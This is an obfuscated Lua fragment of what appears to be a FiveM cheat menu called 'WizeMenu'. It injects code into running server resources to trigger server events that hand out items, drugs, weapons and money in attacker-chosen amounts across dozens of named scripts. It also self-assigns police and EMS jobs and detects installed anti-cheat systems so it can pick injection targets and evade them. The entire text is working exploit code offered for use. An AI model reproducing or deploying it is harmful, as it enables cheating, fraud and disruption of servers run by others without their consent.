TriggerServerEvent("jim-pizzathis:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="jim_recycle") then v69(('pcall(function() TriggerServerEvent("jim-recycle:server:toggleItem", true, "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="jim_shops_blackmarket") then local v486=1798 -(690 + 1108) ;while true do if ((0 + 0)==v486) then v69(('pcall(function() Config.Goodies = { label = "Blackmarket", slots = 1, items = { [1] = { name = "%s", price = 0, amount = %d, info = {}, type = "item", slot = 1 } } } end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="jim_shops_open") then v69('pcall(function() TriggerServerEvent("jim-shops:ShopOpen", "shop", "illegalshit", Config.Goodies) end)');v240=true;elseif (v275.id=="kaves_drugsv2") then local v487=0 + 0 ;while true do if (v487==(848 -(40 + 808))) then v69(('pcall(function() TriggerServerEvent("kaves_drugsv2:server:giveItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="mt_restaurants") then v69(('pcall(function() TriggerServerEvent("mt-restaurants:server:AddItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="mt_printers") then local v488=0;while true do if (v488==0) then v69(('pcall(function() TriggerServerEvent("__ox_cb_mt_printers:server:itemActions", "mt_printers", "mt_printers:server:itemActions:codeplug", "%s", "add") end)'):format(v303));v240=true;break;end end elseif (v275.id=="nx_cayo") then local v489=0 + 0 ;while true do if (v489==(0 -0)) then v69(('pcall(function() TriggerServerEvent("nx-cayo:server:AddItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="okok_crafting") then local v490=0 + 0 ;while true do if (v490==0) then v69(('pcall(function() TriggerServerEvent("okokCrafting:claimAll", "paletogeneral", { ["paletogeneral"] = { [1] = { ["item"] = "%s", ["randomID"] = 431916296, ["recipe"] = { [1] = { [1] = "cash", [2] = 1, [3] = "true", [4] = "false" } }, ["suc"] = true, ["xp"] = 6, ["itemName"] = "Pistol", ["time"] = 0, ["amount"] = %d, ["isPending"] = false, ["isDone"] = true, ["isItem"] = true, ["isDis"] = false, ["sucPC"] = 85 } } }) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="pug_business_creator") then local v491=0;while true do if (0==v491) then v69(('pcall(function() TriggerServerEvent("Pug:server:NewGivBusinessItemAfterHacks", true, "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="pug_chopping") then local v492=0 + 0 ;while true do if (v492==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("Pug:server:GiveChoppingCarPay", %d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="pug_fishing") then local v493=0;while true do if ((571 -(47 + 524))==v493) then v69(('pcall(function() TriggerServerEvent("Pug:server:GiveFish", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="pug_robbery_creator") then local v494=0 + 0 ;while true do if (v494==(0 -0)) then v69(('pcall(function() TriggerServerEvent("Pug:server:RobberyGiveItem", true, "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="qb_crafting") then v69(('pcall(function() TriggerServerEvent("qb-crafting:server:receiveItem", "%s", {}, %d, 0) end)'):format(v303,v304));v240=true;elseif (v275.id=="qb_drugs") then v69(('pcall(function() TriggerServerEvent("qb-drugs:server:giveDrugs", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="qb_garbage_job") then local v495=0 -0 ;while true do if (v495==(0 -0)) then v69(('pcall(function() TriggerServerEvent("qb-garbagejob:server:PayShift", %d, "") end)'):format(v304));v240=true;break;end end elseif (v275.id=="qb_hotdog_job") then local v496=0;while true do if (v496==0) then v69(('pcall(function() local ped = GetPlayerPed(-1) local pedCoords = GetEntityCoords(ped) local HotdogsForSale = 1 local SellingPrice = %d TriggerServerEvent("qb-hotdogjob:server:Sell", pedCoords, HotdogsForSale, SellingPrice) end)'):format(v304));v240=true;break;end end elseif (v275.id=="qb_recycle_job") then local v497=1726 -(1165 + 561) ;while true do if (v497==0) then v69(('pcall(function() TriggerServerEvent("recycle:giveReward", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="qb_trash_search") then v69(('pcall(function() TriggerServerEvent("qb-trashsearch:server:givemoney", math.random(%d, 9999999999999999)) end)'):format(v304));v240=true;elseif (v275.id=="qb_warehouse") then local v498=0 + 0 ;while true do if (v498==0) then v69(('pcall(function() TriggerServerEvent("inside-warehouse:Payout", %d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="rm_camperv") then v69(('pcall(function() TriggerServerEvent("camperv:server:giveItem", "%s", %d) end)'):format(v303,v304));v240=true;elseif (v275.id=="ry_rent") then v69(('pcall(function() TriggerServerEvent("ry-vehiclerental:giveMoney", %d) end)'):format(v304));v240=true;elseif (v275.id=="savana_trucker") then local v499=0;while true do if (v499==(0 -0)) then v69(('pcall(function() TriggerServerEvent("savana-truckerJob:addXpAndMoney", %d, %d) end)'):format(v304,v304));v240=true;break;end end elseif (v275.id=="sayer_jukebox") then local v500=0 + 0 ;while true do if (v500==(479 -(341 + 138))) then v69(('pcall(function() TriggerServerEvent("sayer-jukebox:AddItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="sell_usb") then local v501=0 + 0 ;while true do if (v501==0) then v69(('pcall(function() TriggerEvent("sell_usb:findClient", { i = 8, label = "CodePlugRunsYourShit", type = "codeplug", zone = "The Meat Quarter", price = %d, count = 0 }) end)'):format(v304));v240=true;break;end end elseif (v275.id=="snipe_boombox") then v69(('pcall(function() TriggerServerEvent("snipe-boombox:server:pickup", %d, vector3(0.0, 0.0, 0.0), "%s") end)'):format(v304,v303));v240=true;elseif (v275.id=="solos_cashier") then local v502=0 -0 ;while true do if (v502==(326 -(89 + 237))) then v69(('pcall(function() TriggerServerEvent("solos-cashier:server:addmoney", "bank", %d) end)'):format(v304));v240=true;break;end end elseif (v275.id=="solos_food") then local v503=0;while true do if (v503==(0 -0)) then v69(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="solos_hookah") then local v504=0 -0 ;while true do if (0==v504) then v69(('pcall(function() TriggerServerEvent("solos-hookah:server:Buy-Item", "%s", %d, 0) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="solos_jointroll") then local v505=0;while true do if (v505==(881 -(581 + 300))) then v69(('pcall(function() TriggerServerEvent("solos-jointroll:server:ItemAdd", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="solos_joints") then local v506=0;while true do if (v506==(1220 -(855 + 365))) then v69(('pcall(function() TriggerServerEvent("solos-joints:server:itemadd", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="solos_methlab") then local v507=0 -0 ;while true do if (v507==0) then v69(('pcall(function() TriggerServerEvent("solos-methlab:server:itemadd", "%s", %d, true) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="solos_moneywash") then local v508=0;while true do if ((0 + 0)==v508) then v69(('pcall(function() TriggerServerEvent("solos-moneywash:server:ItemAdd", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="solos_restaurants") then local v509=1235 -(1030 + 205) ;while true do if (v509==0) then v69(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="t1ger_gangsystem") then v69(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d, "codeplugrunsu") end)'):format(v303,v304));v240=true;elseif (v275.id=="t1ger_lib") then local v510=0 + 0 ;while true do if (v510==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="zat_weed") then local v511=286 -(156 + 130) ;while true do if (v511==0) then v69(('pcall(function() TriggerServerEvent("zat-weed:server:AddItem", "%s", nil, %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="zat_farming") then local v512=0 -0 ;while true do if (v512==(0 -0)) then v69(('pcall(function() TriggerServerEvent("zat-farming:server:GiveItem", "%s", %d) end)'):format(v303,v304));v240=true;break;end end elseif (v275.id=="xmmx_letscookplus") then local v513=0 -0 ;while true do if (v513==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:BuyItems", { totalCost = 0, cart = { { name = "%s", quantity = %d } } }, "bank") end)'):format(v303,v304));v240=true;break;end end end if v240 then MachoMenuNotification("WizeMenu","Trigger Worked, Enjoy! Using: "   .. v275.name ,5);break;end end end if  not v240 then local v297={["qb-uwujob"]=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                    local function aswdaw4atsdf()
                        TriggerServerEvent("qb-uwujob:addItem", "]]   .. v236   .. [[", ]]   .. v237   .. [[)
                    end
                    aswdaw4atsdf()
                ]] );end,skirpz_drugplug=function() MachoInjectResource2(3,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function fawfafffsfzxfzx()
                        XTYZ = CreateThread
                        XTYZ(function()
                            for i = 1, ]]   .. v237   .. [[ do
                                local dealer = "shop" .. math.random(1000,9999)
                                TriggerServerEvent = TriggerServerEvent
                                TriggerServerEvent('shop:purchaseItem', shop, ']]   .. v236   .. [[', 0)
                                Wait(100)
                            end
                        end)
                    end
                    fawfafffsfzxfzx()
                ]] );end,ak47_whitewidowv2=function() MachoInjectResource2(2 + 1 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function aXj49WqTpL()
                        local keyName = "ak47_whitewidowv2:process"
                        TriggerServerEvent(keyName, "]]   .. v236   .. [[", {money = 0}, ]]   .. v237   .. [[, 0)
                    end
                    aXj49WqTpL()
                ]] );end,ak47_business=function() MachoInjectResource2(72 -(10 + 59) ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function agjw37257gj()
                        local keyName = "ak47_business:processed"
                        TriggerServerEvent(keyName, "]]   .. v236   .. [[", ]]   .. v237   .. [[)
                    end
                    agjw37257gj()
                ]] );end,ars_hunting=function() MachoInjectResource2(1 + 2 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function ZqMwLpTrYv()
                        local keyName = "ars_hunting:sellBuyItem"
                        TriggerServerEvent(keyName, { buy = true, item = "]]   .. v236   .. [[", price = 0, quantity = ]]   .. v237   .. [[ })
                    end
                    ZqMwLpTrYv()
                ]] );end,fivecode_camping=function() MachoInjectResource2(14 -11 ,(v48("monitor") and "monitor") or "any" ,[[
                    local function GnRtCvXpKa()
                        local keyName = 'fivecode_camping:callCallback'
                        local KeyNameParams = 'fivecode_camping:shopPay'
                        TriggerServerEvent(keyName, KeyNameParams, 0, {
                            ['price'] = 0,
                            ['item'] = "]]   .. v236   .. [[",
                            ['amount'] = ]]   .. v237   .. [[,
                            ['label'] = 'WizeMenu'
                        }, {
                            ['args'] = {
                                ['payment'] = {
                                    ['bank'] = true,
                                    ['cash'] = true
                                }
                            },
                            ['entity'] = 9218,
                            ['distance'] = 0.64534759521484,
                            ['hide'] = false,
                            ['type'] = 'bank',
                            ['label'] = 'Open Shop',
                            ['coords'] = 'vector3(-773.2181, 5597.66, 33.97217)',
                            ['name'] = 'npcShop-vec4(-773.409973, 5597.819824, 33.590000, 172.910004)'
                        })
                    end
                    GnRtCvXpKa()
                ]] );end,spoodyGunPlug=function() MachoInjectResource2(1166 -(671 + 492) ,(v48("spoodyGunPlug") and "spoodyGunPlug") or "any" ,[[
                    local function GnRtCvXpKa()
                        common:giveItem({ { item = "]]   .. v236   .. [[", amount = ]]   .. v237   .. [[ } })  
                    end
                    GnRtCvXpKa()
                ]] );end,["solos-weedtable"]=function() MachoInjectResource2(3 + 0 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    local function aqrqtsgw32w523w()
                        local keyName = "solos-weed:server:itemadd"
                        TriggerServerEvent(keyName, "]]   .. v236   .. [[", ]]   .. v237   .. [[)
                    end
                    aqrqtsgw32w523w()
                ]] );end};local v298=false;for v305,v306 in pairs(v297) do if (GetResourceState(v305)=="started") then local v334=1215 -(369 + 846) ;while true do if (v334==(0 + 0)) then v306();v298=true;break;end end end end if  not v298 then MachoMenuNotification("[NOTIFICATION] WizeMenu","No Triggers Found.");end end end);MachoMenuButton(v46[2],"Police Job",function() local v241=0;while true do if (0==v241) then if  not v7() then return;end if v48("wasabi_multijob") then MachoInjectResource("wasabi_multijob",[[
           local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
           TriggerEvent('esx:setJob',)
        ]]);else MachoMenuNotification("[NOTIFICATION] WizeMenu","Resource Not Found.");end break;end end end);MachoMenuButton(v46[2 + 0 ],"EMS Job",function() local v242=1945 -(1036 + 909) ;while true do if (v242==(0 + 0)) then if  not v7() then return;end if v48("wasabi_multijob") then MachoInjectResource("wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic" }
            TriggerServerEvent('wasabi_multijob:addJob', job)
        ]]);else MachoMenuNotification("[NOTIFICATION] WizeMenu","Resource Not Found.");end break;end end end);MachoMenuButton(v47[1],"Uninject",function() local v243=0;while true do if (v243==(0 -0)) then MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            Stopped = true
        ]]);MachoInjectResource((v48("core") and "core") or (v48("es_extended") and "es_extended") or (v48("qb-core") and "qb-core") or (v48("monitor") and "monitor") or "any" ,[[
            anvzBDyUbl = false
            if fLwYqKoXpRtB then fLwYqKoXpRtB() end
            kLpMnBvCxZqWeRt = false
        ]]);v243=204 -(11 + 192) ;end if (v243==1) then MachoMenuDestroy(v20);break;end end end);MachoMenuCheckbox(v47[2 + 0 ],"RGB Menu",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if FmxmAlwkjfsfmaW == nil then FmxmAlwkjfsfmaW = false end
            FmxmAlwkjfsfmaW = true

            local function CreateRGBUI()
                local wfgsmWAEJKF = CreateThread
                wfgsmWAEJKF(function()
                    local offset = 0.0
                    while FmxmAlwkjfsfmaW and not Unloaded do
                        offset = offset + 0.065
                        local r = math.floor(127 + 127 * math.sin(offset))
                        local g = math.floor(127 + 127 * math.sin(offset + 2))
                        local b = math.floor(127 + 127 * math.sin(offset + 4))
                        MachoMenuSetAccent(MenuWindow, r, g, b)
                        Wait(25)
                    end
                end)
            end

            CreateRGBUI()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            FmxmAlwkjfsfmaW = false
        ]]);end);local v70,v71,v72=382 -(135 + 40) ,16,77 -45 ;MachoMenuSlider(v47[2 + 0 ],"R",v70,0,561 -306 ,"",0 -0 ,function(v244) local v245=176 -(50 + 126) ;while true do if (v245==(0 -0)) then v70=v244;MachoMenuSetAccent(v20,math.floor(v70),math.floor(v71),math.floor(v72));break;end end end);MachoMenuSlider(v47[2],"G",v71,0,255,"",0,function(v246) local v247=0 + 0 ;while true do if (v247==(1413 -(1233 + 180))) then v71=v246;MachoMenuSetAccent(v20,math.floor(v70),math.floor(v71),math.floor(v72));break;end end end);MachoMenuSlider(v47[2],"B",v72,969 -(522 + 447) ,255,"",1421 -(107 + 1314) ,function(v248) local v249=0 + 0 ;while true do if (v249==0) then v72=v248;MachoMenuSetAccent(v20,math.floor(v70),math.floor(v71),math.floor(v72));break;end end end);MachoMenuButton(v47[3],"Anti-Cheat Checker",function() local function v250(v277,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v277,...));end local function v251(v278,v279) local v280=0;local v281;while true do if (v280==0) then v281=LoadResourceFile(v278,v279);return v281~=nil ;end end end local v252=GetNumResources();local v253={{name="ai_module_fg-obfuscated.lua",acName="FiveGuard"}};for v282=0,v252-1  do local v283=0;local v284;local v285;local v286;while true do if (2==v283) then if (v285:sub(1,3 + 4 )=="reaperv") then v286="ReaperV4";elseif (v285:sub(1 -0 ,15 -11 )=="fini") then v286="FiniAC";elseif (v285:sub(1,1917 -(716 + 1194) )=="chubsac") then v286="ChubsAC";elseif (v285:sub(1 + 0 ,1 + 5 )=="fireac") then v286="FireAC";elseif (v285:sub(1,510 -(74 + 429) )=="drillac") then v286="DrillAC";elseif (v285:sub( -(13 -6))=="eshield") then v286="WaveShield";elseif (v285:sub( -(5 + 5))=="likizao_ac") then v286="Likizao-AC";elseif (v285:sub(2 -1 ,5)=="greek") then v286="GreekAC";elseif (v285=="pac") then v286="PhoenixAC";elseif (v285=="electronac") then v286="ElectronAC";end if v286 then v250("Anti-Cheat: %s",v286);AntiCheat=v286;return v284,v286;end break;end if (v283==(0 + 0)) then v284=GetResourceByFindIndex(v282);v285=string.lower(v284);v283=2 -1 ;end if (v283==(2 -1)) then for v335,v336 in ipairs(v253) do if v251(v284,v336.name) then local v390=0;while true do if (v390==0) then v250("Anti-Cheat: %s",v336.acName);AntiCheat=v336.acName;v390=434 -(279 + 154) ;end if (v390==1) then return v284,v336.acName;end end end end v286=nil;v283=780 -(454 + 324) ;end end end v250("No Anti-Cheat found");return nil,nil;end);MachoMenuButton(v47[3 + 0 ],"Framework Checker",function() local v254=0;local v255;local v256;local v257;local v258;local v259;while true do if (v254==(19 -(12 + 5))) then v257={{label="ESX",globals={"ESX"},resources={"es_extended","esx-legacy"}},{label="QBCore",globals={"QBCore"},resources={"qb-core"}},{label="Qbox",globals={},resources={"qbox"}},{label="QBX Core",globals={},resources={"qbx-core"}},{label="ox_core",globals={"Ox"},resources={"ox_core"}},{label="ND_Core",globals={"NDCore"},resources={"nd-core","ND_Core"}},{label="vRP",globals={"vRP"},resources={"vrp"}}};v258=nil;v254=3;end if (v254==(1777 -(1111 + 663))) then function v258() for v337,v338 in ipairs(v257) do for v373,v374 in ipairs(v338.globals) do if (_G[v374]~=nil) then return v338.label;end end end for v339,v340 in ipairs(v257) do for v375,v376 in ipairs(v340.resources) do if v256(v376) then return v340.label;end end end return "Standalone";end v259=v258();v254=1583 -(874 + 705) ;end if (v254==(1 + 0)) then v256=nil;function v256(v319) return GetResourceState(v319)=="started" ;end v254=2 + 0 ;end if (v254==(0 -0)) then v255=nil;function v255(v320,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v320,...));end v254=1 + 0 ;end if (v254==(683 -(642 + 37))) then v255("Framework: %s",v259);break;end end end);local v54=0 + 0 ;local v55={[0 + 0 ]={name="Default",hash="MP_F_Freemode"},[2 -1 ]={name="Gangster",hash="Gang1H"},[456 -(233 + 221) ]={name="Wild",hash="GangFemale"},[6 -3 ]={name="Red Neck",hash="Hillbilly"}};
